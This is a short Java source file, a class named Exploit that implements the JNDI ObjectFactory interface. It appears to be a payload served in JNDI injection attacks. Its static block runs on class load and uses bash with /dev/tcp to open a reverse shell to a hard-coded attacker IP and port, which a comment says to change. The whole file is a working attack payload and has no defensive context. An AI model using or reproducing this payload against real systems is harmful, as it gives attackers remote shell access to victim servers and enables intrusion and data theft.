import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class Exploit implements ObjectFactory{
  static {
  
    //Change this to the desired IP and port of the machine receving the reverse shell
    String ip = "192.168.1.2";
    int port = 443;

    try {
	String[] command = {
	  "/bin/bash",
	  "-c",
	  "exec 5<>/dev/tcp/" + ip + "/" + port + "; exec bash <&5 >&5 2>&5"
	};

    Process process = Runtime.getRuntime().exec(command);
    process.waitFor();

    } catch (Exception e) {
	e.printStackTrace();
    }
  }
  public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
	return null;
  }
}
